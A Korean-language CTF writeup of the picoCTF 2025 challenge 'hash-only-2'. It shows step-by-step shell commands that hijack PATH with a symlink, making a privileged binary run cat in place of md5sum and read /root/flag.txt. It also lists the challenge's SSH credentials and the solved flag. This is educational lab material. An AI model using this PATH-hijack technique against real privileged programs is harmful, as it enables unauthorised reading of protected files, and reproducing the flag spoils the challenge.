---
title: hash-only-2 — picoCTF 2025 binary exploitation writeup
created: 2026-06-23
updated: 2026-06-23
type: query
tags: [ctf, picoctf, pwn, binary-exploitation, path-hijack, system-abuse]
sources: [https://github.com/PS-003R32/picoCTF/blob/main/picoCTF-2025/Binary-Exploitation/hash-only-2.md]
confidence: high
---

# hash-only-2 — picoCTF 2025 binary exploitation writeup

> hash-only-1의 발전형입니다. 이번에는 alias가 막혀 있어 동작하지 않습니다. 대신 **symbolic link + PATH 조작**으로 `md5sum` 명령어를 `cat`으로 치환합니다.

## 접속 정보
```
ssh ctf-player@rescued-float.picoctf.net -p 58055
password: 483e80d4
```

## 1. 분석
`flaghasher`는 hash-only-1과 동일하게 `md5sum /root/flag.txt`를 실행합니다.
하지만 `alias md5sum='/bin/cat'`는 동작하지 않습니다.

## 2. 공격 흐름

### Step 1: Symlink 생성
```bash
ln -s /bin/cat md5sum
```

### Step 2: PATH 조작
```bash
export PATH=".:$PATH"
```

### Step 3: Symlink를 PATH 디렉터리로 이동
```bash
mv md5sum /usr/local/bin/
```

### Step 4: flaghasher 실행
```bash
flaghasher
picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_364b3672}
```

## Flag
`picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_364b3672}`

## 3. 핵심 패턴
1. hash-only-1과 목표는 같지만 **alias가 막힌 환경**에서 우회
2. **Symlink**로 명령어 자체를 다른 프로그램으로 대체
3. **PATH 조작**으로 심볼릭 링크가 실제 명령어보다 먼저 실행되도록 함
4. `/usr/local/bin`은 일반 user도 write 가능한 표준 PATH 디렉터리

## 4. 연결 개념
- [[path-hijacking-system-abuse-ctf-patterns]]
- [[exploitation]]